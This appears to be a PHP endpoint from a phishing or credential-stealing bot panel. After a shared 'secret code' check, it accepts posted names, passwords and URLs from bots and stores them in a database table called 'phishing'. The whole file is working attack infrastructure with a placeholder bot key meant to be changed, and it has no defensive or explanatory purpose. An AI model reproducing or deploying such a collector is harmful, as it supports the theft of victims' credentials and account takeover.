<?php
// Definindo encode pra UTF-8
header('Content-type: text/html; charset="utf-8"',true);

require "../helper/class.crud.php";

//change this use key of your bot
$secret_code="testbot";

//register machine
if($_POST['secret_code']==$secret_code)
{
	$crud = new crud();
	$name=htmlentities($_POST['name']); if(!$name) { print "need name"; exit; }
	$date=date('Y-m-d H:i:s'); 
	$password=htmlentities($_POST['password']); 
	$url=htmlentities($_POST['url']);

	$values = array(
		array(
                  'name'=>"$name", 
                  'date'=>"$date", 
                  'password'=>"$password", 
                  'url'=>"$url"
                 )
                );
	$crud->dbInsert('phishing', $values);
} else {
 echo "error at secret code";
}	
?>
